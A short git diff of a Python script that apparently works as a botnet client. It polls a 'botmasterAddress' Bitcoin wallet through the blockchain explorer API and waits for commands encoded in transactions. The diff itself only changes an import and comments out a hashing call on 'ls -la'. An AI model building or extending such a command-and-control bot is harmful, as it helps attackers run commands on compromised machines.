@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 import time
-from hashData import hashData
+import CryptographyFunctions
 from blockchain import blockexplorer
 # maybe try with websockets later on // https://www.blockchain.com/api/api_websocket
 # my wallet actual address
@@ -40,7 +40,7 @@ DecodedTransactionsList = []
 #       else loop again and wait for next command
 # 5. Finish
 string = "ls -la"
-hashData(string)
+# hashData(string)
 
 while True:
     currentTrxs = blockexplorer.get_address(botmasterAddress).n_tx
